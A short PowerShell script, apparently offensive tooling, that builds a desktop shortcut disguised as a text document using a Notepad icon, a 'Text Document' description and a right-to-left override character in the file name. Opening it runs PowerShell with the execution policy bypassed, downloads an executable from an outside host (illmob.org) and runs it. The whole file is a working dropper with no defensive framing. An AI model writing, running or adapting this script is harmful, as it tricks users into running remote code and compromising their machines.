$Shell = New-Object -ComObject ("WScript.Shell")
$ShortCut = $Shell.CreateShortcut($env:USERPROFILE + "\Desktop\FakeText.lnk")
$ShortCut.Arguments = " -ExecutionPolicy Bypass -noLogo -Command (new-object System.Net.WebClient).DownloadFile('http://illmob.org/test.exe','test.exe');./test.exe;"
$ShortCut.TargetPath = "powershell"
$ShortCut.IconLocation = "C:\Windows\System32\notepad.exe, 0";
$ShortCut.Description = "Type: Text Document";
$ShortCut.Save()
$unicode = "%u0052%u0065%u0061%u0064%u004d%u0065%u002e%u202e%u0074%u0078%u0074%u002e%u006c%u006e%u006b"
[Reflection.Assembly]::LoadWithPartialName("System.Web")
$unescape = [web.httputility]::urldecode($unicode)
ren ($env:USERPROFILE + "\Desktop\FakeText.lnk") ($env:USERPROFILE + "\Desktop\" + $unescape)
